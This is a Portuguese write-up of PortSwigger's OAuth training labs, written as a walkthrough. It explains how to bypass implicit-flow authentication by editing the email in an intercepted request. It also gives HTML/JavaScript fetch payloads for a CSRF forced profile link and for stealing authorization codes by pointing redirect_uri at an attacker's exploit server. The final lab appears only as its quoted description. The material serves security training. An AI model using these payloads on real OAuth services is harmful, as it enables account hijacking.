---
title: "PortSwigger - OAuth"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de OAuth da PortSwigger"
keywords: ["PortSwigger", "OAuth", "Authentication", "Authorization", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Authentication bypass via OAuth implicit flow
"This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.
To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net.
You can log in with your own social media account using the following credentials: wiener:peter"
1. Intercepte as requisições de login pelo Burp e dê foward para as requisições até chegar na requisição para o endpoint `/authenticate`
2. Edite a requisição, trocando o email e o username de `wiener` por `carlos`. Dê foward na requisição.
O que aconteceu? O token do servidor é utilizado para enviar a requisição POST para tornar a sessão durável (manter a sessão mesmo ao fechar a página) possuindo como dados o token de acesso. 

## Lab: Forced OAuth profile linking
"This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.
To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete carlos.
The admin user will open anything you send from the exploit server and they always have an active session on the blog website.
You can log in to your own accounts using the following credentials:
    Blog website account: wiener:peter
    Social media profile: peter.wiener:hotdog
"
1. Faça o fluxo de login sem o perfil social.
2. Depois, com Burp, intercepte as requisições e a seguinte requisição pode ser observada: 
```
/auth?client_id=sv7ctjc6ysdr6wjfqfysc&redirect_uri=https://0aaf002204ed739a813dbbba00240082.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email
```
que ao ser enviada retorna um redirecionamento com a forma: `https://0aaf002204ed739a813dbbba00240082.web-security-academy.net/oauth-linking?code=<code>`. Não siga o redirecionamento.
3. Utilize a última URL para forjar a requisição no servidor de exploit.
```html
<script>
fetch('https://0aaf002204ed739a813dbbba00240082.web-security-academy.net/oauth-linking?code=<code>', {
  method: 'GET',
  credentials: 'include',
  mode: 'no-cors'
})
</script>
```
4. Entregue o exploit para a vítima.
5. Visite a página de login e vá para a opção de login com social media. Após autenticado na conta wiener, o acesso a conta de administrador é concedido.

## Lab: OAuth account hijacking via redirect_uri
"This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.
The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
You can log in with your own social media account using the following credentials: wiener:peter. "
1. No fluxo de autenticação, intercepte a primeira requisição para `/auth` e copie toda URL.
2. No servidor de exploit, cole a URL no primeiro argumento do fetch e modifique o parâmetro redirect_uri para a URL dos servidor de exploit.
```html
<script>
fetch('https://oauth-<>.oauth-server.net/auth?client_id=<>&redirect_uri=https://exploit-<>.exploit-server.net&response_type=code&scope=openid%20profile%20email', {
  method: 'GET',
  credentials: 'include',
  mode: 'no-cors'
})
</script>
```
3. No log do servidor de exploit, haverá uma entrada com uma requisição GET com um token na forma: `?code=<token>`. Esse é o token enviado pelo servidor de autenticação através do resource owner, em que no fluxo normal estaria sendo enviado para o cliente (aplicação) , a fim de realizar a comunicação entre cliente e endpoint de token, sem o intermédio do usuário.
4. Copie esse token e dê prosseguimento a autenticação com o usuário `wiener`, até chegar na requisição `GET` equivalente aquela vazada para o servidor de exploit.
5. Altere a requisição, substituindo o valor do parâmetro code pelo copiado. 
6. Dê foward na requisição e terá acesso ao administrador.

## Lab: Stealing OAuth access tokens via an open redirect
"This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner. "
